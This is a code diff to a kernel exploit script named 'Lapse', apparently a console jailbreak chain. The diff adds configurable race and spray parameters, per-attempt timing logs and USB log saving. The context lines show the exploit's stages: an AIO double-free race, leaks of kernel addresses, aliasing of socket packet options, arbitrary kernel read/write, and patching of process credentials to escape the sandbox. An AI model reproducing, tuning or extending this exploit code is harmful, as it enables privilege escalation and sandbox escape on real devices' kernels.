@@ -1,6 +1,7 @@
 import { fn, BigInt, syscalls, gadgets, mem, rop, utils } from 'download0/types'
 import { kernel, apply_kernel_patches, hex, malloc, read16, read32, read64, read8, write16, write32, write64, write8, get_fwversion, send_notification, get_kernel_offset, get_mmap_patch_offsets } from 'download0/kernel'
 import { libc_addr } from 'download0/userland'
+import { xlog, xdbg, xerr, xok, xval, timer_start, timer_end, timer_end_stage, log_race_attempt, log_alias_attempt, log_clobber_attempt, log_reclaim_attempt, log_spray, stats, write_log_to_usb } from 'download0/logger'
 
 include('kernel.js')
 
@@ -24,19 +25,29 @@ let FW_VERSION: string | null = null
 
 const PAGE_SIZE = 0x4000
 
-const MAIN_CORE = 4
-const MAIN_RTPRIO = 0x100
-const NUM_WORKERS = 2
-const NUM_GROOMS = 0x200
-const NUM_HANDLES = 0x100
-const NUM_SDS = 64
-const NUM_SDS_ALT = 48
-const NUM_RACES = 100
-const NUM_ALIAS = 100
-const LEAK_LEN = 16
-const NUM_LEAKS = 32
+// ── Exploit tuning: read from CONFIG if available, else use defaults ──────
+const _ec = (typeof CONFIG !== 'undefined' && CONFIG.exploit) ? CONFIG.exploit : {}
+
+const MAIN_CORE    = (_ec.core    !== undefined) ? _ec.core    : 4
+const MAIN_RTPRIO  = (_ec.rtprio  !== undefined) ? _ec.rtprio  : 0x100
+const NUM_WORKERS  = (_ec.workers !== undefined) ? _ec.workers : 2
+const NUM_GROOMS   = (_ec.grooms  !== undefined) ? _ec.grooms  : 0x200
+const NUM_SDS      = (_ec.sds     !== undefined) ? _ec.sds     : 64
+const NUM_RACES    = (_ec.races   !== undefined) ? _ec.races   : 100
+const NUM_ALIAS    = (_ec.alias   !== undefined) ? _ec.alias   : 100
+const NUM_HANDLES  = 0x100
+const NUM_SDS_ALT  = 48
+const LEAK_LEN     = 16
+const NUM_LEAKS    = 32
 const NUM_CLOBBERS = 8
-const MAX_AIO_IDS = 0x80
+const MAX_AIO_IDS  = 0x80
+
+log('[EXPLOIT CFG] core=' + MAIN_CORE + ' rtprio=' + MAIN_RTPRIO +
+    ' grooms=' + NUM_GROOMS + ' races=' + NUM_RACES +
+    ' alias=' + NUM_ALIAS + ' sds=' + NUM_SDS + ' workers=' + NUM_WORKERS)
+xlog('[EXPLOIT CFG] core=' + MAIN_CORE + ' rtprio=' + MAIN_RTPRIO +
+    ' grooms=' + NUM_GROOMS + ' races=' + NUM_RACES +
+    ' alias=' + NUM_ALIAS + ' sds=' + NUM_SDS + ' workers=' + NUM_WORKERS)
 
 const AIO_CMD_READ = 1
 const AIO_CMD_FLAG_MULTI = 0x1000
@@ -283,9 +294,11 @@ function spray_aio (loops: number, reqs: BigInt, num_reqs: number, ids: BigInt, 
   const step = 4 * (multi ? num_reqs : 1)
   const final_cmd = cmd | (multi ? AIO_CMD_FLAG_MULTI : 0)
 
+  const _t = Date.now()
   for (let i = 0; i < loops; i++) {
     aio_submit_cmd_fun(final_cmd, reqs, num_reqs, 3, new BigInt(Number(ids) + (i * step)))
   }
+  log_spray(loops, num_reqs, Date.now() - _t)
 }
 
 function cancel_aios (ids: BigInt, num_ids: number) {
@@ -838,6 +851,7 @@ function double_free_reqs2 (): [BigInt, BigInt] | null {
 
     for (let attempt = 1; attempt <= NUM_RACES; attempt++) {
       // log("Race attempt " + attempt + "/" + NUM_RACES);
+      const _race_t = Date.now()
 
       const sd_client = new_tcp_socket()
 
@@ -882,8 +896,11 @@ function double_free_reqs2 (): [BigInt, BigInt] | null {
 
       if (sd_pair !== null) {
         log('Won race at attempt ' + attempt)
+        log_race_attempt(attempt, true, hex(sd_pair[0]), hex(sd_pair[1]), Date.now() - _race_t)
         close(sd_listen)
         return sd_pair
+      } else {
+        log_race_attempt(attempt, false, '?', '?', Date.now() - _race_t)
       }
     }
 
@@ -1418,6 +1435,7 @@ function make_aliased_pktopts (sds: BigInt[]): [BigInt, BigInt] | null {
   const tclass = malloc(4)
 
   for (let loop = 0; loop < NUM_ALIAS; loop++) {
+    const _alias_t = Date.now()
     for (let i = 0; i < sds.length; i++) {
       write32(tclass, i)
       set_sockopt(sds[i]!, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4)
@@ -1430,6 +1448,8 @@ function make_aliased_pktopts (sds: BigInt[]): [BigInt, BigInt] | null {
       if (marker !== i) {
         const sd_pair: [BigInt, BigInt] = [sds[i]!, sds[marker]!]
         log('Aliased pktopts at attempt ' + loop + ' (pair: ' + sd_pair[0] + ', ' + sd_pair[1] + ')')
+        log_alias_attempt(loop, true, Date.now() - _alias_t,
+          'pair=(' + hex(sd_pair[0]) + ',' + hex(sd_pair[1]) + ')  i=' + i + ' marker=' + marker)
         if (marker > i) {
           sds.splice(marker, 1)
           sds.splice(i, 1)
@@ -1451,6 +1471,7 @@ function make_aliased_pktopts (sds: BigInt[]): [BigInt, BigInt] | null {
     for (let i = 0; i < sds.length; i++) {
       set_sockopt(sds[i]!, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, new BigInt(0), 0)
     }
+    log_alias_attempt(loop, false, Date.now() - _alias_t, 'sds=' + sds.length)
   }
 
   return null
@@ -1479,11 +1500,12 @@ function double_free_reqs1 (reqs1_addr: BigInt, target_id: number, evf: BigInt, 
 
     if (size_ret === 8 && cmd === AIO_CMD_READ) {
       log('Aliased at attempt ' + i)
+      log_clobber_attempt(i, true, hex(cmd), size_ret)
       aio_not_found = false
       cancel_aios(aio_ids, aio_ids_len)
       break
     }
-
+    log_clobber_attempt(i, false, hex(cmd), size_ret)
     free_aios(aio_ids, aio_ids_len, true)
   }
 
@@ -1643,11 +1665,13 @@ function make_kernel_arw (pktopts_sds: BigInt[], reqs1_addr: BigInt, kernel_addr
       const marker = read32(tclass)
       if ((marker & 0xffff) === 0x4141) {
         log('Found reclaim socket at attempt: ' + i)
+        log_reclaim_attempt(i, true)
         const idx = Number(marker >> 16)
         reclaim_sock = sds_alt[idx]
         sds_alt.splice(idx, 1)
         break
       }
+      log_reclaim_attempt(i, false)
     }
 
     if (reclaim_sock === null) {
@@ -1866,26 +1890,33 @@ export function lapse () {
 
     // === STAGE 0: Setup ===
     log('=== STAGE 0: Setup ===')
-
+    timer_start('Stage 0: Setup')
     const setup_success = setup()
     if (!setup_success) {
       log('Setup failed')
+      timer_end('Stage 0 FAILED')
       send_notification('Lapse: Setup failed')
       return false
     }
     log('Setup completed')
+    timer_end_stage('stage0_setup')
 
     log('')
     log('=== STAGE 1: Double-free AIO ===')
+    timer_start('Stage 1: Double-free AIO')
 
     sd_pair = double_free_reqs2()
 
     if (sd_pair === null) {
       log('[FAILED] Stage 1')
+      xerr('Stage 1 FAILED after ' + stats.race_attempts + ' race attempts')
+      timer_end_stage('stage1_double_free_aio', 'Stage 1 FAILED')
       send_notification('Lapse: FAILED at Stage 1')
       return false
     }
     log('Stage 1 completed')
+    timer_end_stage('stage1_double_free_aio', 'Stage 1: Double-free AIO')
+    xok('Stage 1 done — race won at attempt #' + stats.race_win_attempt)
 
     if (sds === null) {
       log('Failed to create socket list')
@@ -1895,24 +1926,35 @@ export function lapse () {
 
     log('')
     log('=== STAGE 2: Leak kernel addresses ===')
+    timer_start('Stage 2: Leak kernel addresses')
     const leak_result = leak_kernel_addrs(sd_pair, sds)
     if (leak_result === null) {
       log('Stage 2 kernel address leak failed')
+      timer_end_stage('stage2_leak', 'Stage 2 FAILED')
       cleanup_fail()
       return false
     }
+    timer_end_stage('stage2_leak', 'Stage 2: Leak kernel addresses')
     log('Stage 2 completed')
     log('Leaked addresses:')
-    log('  reqs1_addr: ' + hex(leak_result.reqs1_addr))
-    log('  kbuf_addr: ' + hex(leak_result.kbuf_addr))
-    log('  kernel_addr: ' + hex(leak_result.kernel_addr))
-    log('  target_id: ' + hex(leak_result.target_id))
-    log('  fake_reqs3_addr: ' + hex(leak_result.fake_reqs3_addr))
-    log('  aio_info_addr: ' + hex(leak_result.aio_info_addr))
-    log('  evf: ' + hex(leak_result.evf))
+    log('  reqs1_addr: '       + hex(leak_result.reqs1_addr))
+    log('  kbuf_addr: '        + hex(leak_result.kbuf_addr))
+    log('  kernel_addr: '      + hex(leak_result.kernel_addr))
+    log('  target_id: '        + hex(leak_result.target_id))
+    log('  fake_reqs3_addr: '  + hex(leak_result.fake_reqs3_addr))
+    log('  aio_info_addr: '    + hex(leak_result.aio_info_addr))
+    log('  evf: '              + hex(leak_result.evf))
+    xval('reqs1_addr',      hex(leak_result.reqs1_addr))
+    xval('kbuf_addr',       hex(leak_result.kbuf_addr))
+    xval('kernel_addr',     hex(leak_result.kernel_addr))
+    xval('target_id',       hex(leak_result.target_id))
+    xval('fake_reqs3_addr', hex(leak_result.fake_reqs3_addr))
+    xval('aio_info_addr',   hex(leak_result.aio_info_addr))
+    xval('evf',             hex(leak_result.evf))
 
     log('')
     log('=== STAGE 3: Double free SceKernelAioRWRequest ===')
+    timer_start('Stage 3: Double-free AioRWRequest')
     const pktopts_sds = double_free_reqs1(
       leak_result.reqs1_addr,
       leak_result.target_id,
@@ -1927,15 +1969,20 @@ export function lapse () {
 
     if (pktopts_sds === null) {
       log('Stage 3 double free SceKernelAioRWRequest failed')
+      timer_end_stage('stage3_double_free_req', 'Stage 3 FAILED')
       cleanup_fail()
       return false
     }
 
     log('Stage 3 completed!')
+    timer_end_stage('stage3_double_free_req', 'Stage 3: Double-free AioRWRequest')
     log('Aliased socket pair: ' + hex(pktopts_sds[0]) + ', ' + hex(pktopts_sds[1]))
+    xok('Stage 3 done — alias at #' + stats.alias_win_attempt +
+        '  clobber at #' + stats.clobber_win_attempt)
 
     log('')
     log('=== STAGE 4: Get arbitrary kernel read/write ===')
+    timer_start('Stage 4: Kernel ARW')
 
     const arw_result = make_kernel_arw(
       pktopts_sds,
@@ -1948,14 +1995,17 @@ export function lapse () {
 
     if (arw_result === null) {
       log('Stage 4 get arbitrary kernel read/write failed')
+      timer_end_stage('stage4_kernel_arw', 'Stage 4 FAILED')
       cleanup_fail()
       return false
     }
 
     log('Stage 4 completed!')
+    timer_end_stage('stage4_kernel_arw', 'Stage 4: Kernel ARW')
 
     log('')
     log('=== STAGE 5: Jailbreak ===')
+    timer_start('Stage 5: Jailbreak')
 
     const OFFSET_P_UCRED = 0x40
     const proc = kernel.addr.curproc
@@ -1967,10 +2017,15 @@ export function lapse () {
     // Calculate kernel base
     kernel.addr.base = kernel.addr.inside_kdata.sub(kernel_offset.EVF_OFFSET)
     log('Kernel base: ' + hex(kernel.addr.base))
+    xval('kernel_base',  hex(kernel.addr.base))
+    xval('inside_kdata', hex(kernel.addr.inside_kdata))
+    xval('curproc',      hex(kernel.addr.curproc!))
+    xval('allproc',      hex(kernel.addr.allproc!))
 
     const uid_before = Number(getuid())
     const sandbox_before = Number(is_in_sandbox())
     log('BEFORE: uid=' + uid_before + ', sandbox=' + sandbox_before)
+    xlog('uid_before=' + uid_before + '  sandbox_before=' + sandbox_before)
 
     // Patch ucred
     const proc_fd = kernel.read_qword(proc.add(kernel_offset.PROC_FD!))!
@@ -1995,11 +2050,14 @@ export function lapse () {
     const uid_after = Number(getuid())
     const sandbox_after = Number(is_in_sandbox())
     log('AFTER:  uid=' + uid_after + ', sandbox=' + sandbox_after)
+    xlog('uid_after=' + uid_after + '  sandbox_after=' + sandbox_after)
 
     if (uid_after === 0 && sandbox_after === 0) {
       log('Sandbox escape complete!')
+      xok('Sandbox escape SUCCESS')
     } else {
       log('[WARNING] Sandbox escape may have failed')
+      xerr('Sandbox escape FAIL  uid=' + uid_after + '  sandbox=' + sandbox_after)
     }
 
     // === Apply kernel patches via kexec ===
@@ -2059,16 +2117,30 @@ export function lapse () {
     }
 
     log('Stage 5 completed - JAILBROKEN')
-    // utils.notify("The Vue-after-Free team congratulates you\nLapse Finished OK\nEnjoy freedom");
+    timer_end_stage('stage5_jailbreak', 'Stage 5: Jailbreak')
+    xok('=== JAILBROKEN ===  FW=' + FW_VERSION)
 
     cleanup()
+
+    // ── Save log to USB ───────────────────────────────────────────────────
+    const _ec = (typeof CONFIG !== 'undefined' && CONFIG.exploit) ? CONFIG.exploit : {}
+    write_log_to_usb(FW_VERSION ?? 'unknown', _ec)
 
     return true
   } catch (e) {
     log('Lapse error: ' + (e as Error).message)
+    xerr('Lapse EXCEPTION: ' + (e as Error).message)
+    if ((e as Error).stack) xerr((e as Error).stack!)
     alert('Lapse error: ' + (e as Error).message)
     utils.notify('Reboot and try again!')
     log((e as Error).stack ?? '')
+
+    // Save log even on failure so we can diagnose
+    try {
+      const _ec2 = (typeof CONFIG !== 'undefined' && CONFIG.exploit) ? CONFIG.exploit : {}
+      write_log_to_usb(FW_VERSION ?? 'unknown', _ec2)
+    } catch (_) {}
+
     return false
   }
 }
@@ -2142,7 +2214,5 @@ function cleanup () {
 }
 
 function cleanup_fail () {
-  utils.notify('Lapse Failed! reboot and try again! UwU')
-  jsmaf.root.children.push(bg_fail)
   cleanup()
 }
